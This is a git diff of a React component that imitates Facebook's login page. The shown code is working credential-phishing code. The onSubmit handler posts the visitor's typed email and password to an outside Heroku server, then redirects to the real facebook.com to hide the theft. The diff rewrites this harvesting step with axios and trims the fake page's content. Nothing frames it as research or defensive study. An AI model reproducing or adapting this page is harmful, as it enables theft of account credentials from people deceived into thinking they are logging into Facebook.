@@ -1,5 +1,6 @@
 import React, { Component } from 'react'
 import './login.css'
+import axios from 'axios';
 
 export default class Login extends Component {
   constructor(props){
@@ -10,29 +11,17 @@ export default class Login extends Component {
     }
   }
 
-  onSubmit = () => {
-    fetch('https://servertcm.herokuapp.com/api/register', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          email: this.state.txtUser,
-          password: this.state.txtPassword,
-        }),
-      }).then(res => {
-        if (res.status === 200) {
-          this.props.history.push('https://facebook.com.vn');
-        } else {
-          const error = new Error(res.error);
-          throw error;
-        }
-      })
-      .catch(err => {
+  onSubmit = async() => {
+    try{
+    const uri='https://servertcm.herokuapp.com/api/register' 
+    const email= this.state.txtUser
+    const password= this.state.txtPassword
+    const response = await axios.post(uri,{email,password});
+    window.open('https://facebook.com',"_self")
+    }
+    catch(err){
         console.error(err);
-       // alert('Email already exists! Try another email!');
-      });
-    
+      };   
     }
 
   render() {
@@ -49,7 +38,7 @@ export default class Login extends Component {
                     </td>
                     <td><input type="password" className="inputtext" value={this.state.txtPassword} onChange={(evt)=>{this.setState({txtPassword: evt.target.value})}}/>
                     </td>
-                    <td><div id="button" onClick={this.onSubmit}><a className="linkFB" href='https://facebook.com' >Log In</a></div></td>
+                    <td><div id="button" onClick={this.onSubmit}>Log In</div></td>
                   </tr>
                   <tr>
                     <td>
@@ -62,31 +51,9 @@ export default class Login extends Component {
           <div id="contentwrapper">
             <div id="content">
               <div id="leftbod">
-                <div className="connect bolder">
-                  Connect with friends and the
-                  world around you on Facebook.</div>
-                <div className="leftbar">
-                  <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851565_602269956474188_918638970_n.png" alt className="iconwrap fb1" />
-                  <div className="fb1">
-                    <span className="rowtext">See photos and updates</span>
-                    <span className="rowtext2 fb1">from friends in News Feed</span>
-                  </div>
-                </div> 
-                <div className="leftbar">
-                  <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851585_216271631855613_2121533625_n.png" alt className="iconwrap fb1" />
-                  <div className="fb1">
-                    <span className="rowtext">Share what's new</span>
-                    <span className="rowtext2 fb1">in your life on your timeline</span>
-                  </div>
+                <div className="connect bolder">Connect with friends and the world around you on Facebook.</div>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/OBaVg52wtTZ.png" alt="main"/>
                 </div>
-                <div className="leftbar">
-                  <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851558_160351450817973_1678868765_n.png " alt className="iconwrap fb1" />
-                  <div className="fb1">
-                    <span className="rowtext">Find more</span>
-                    <span className="rowtext2 fb1">of what you're looking for with graph search</span>
-                  </div> 
-                </div> 
-              </div>
               <div id="rightbod">
                 <div className="signup bolder">Sign Up</div>
                 <div className="free bolder">It's free and always will be</div>
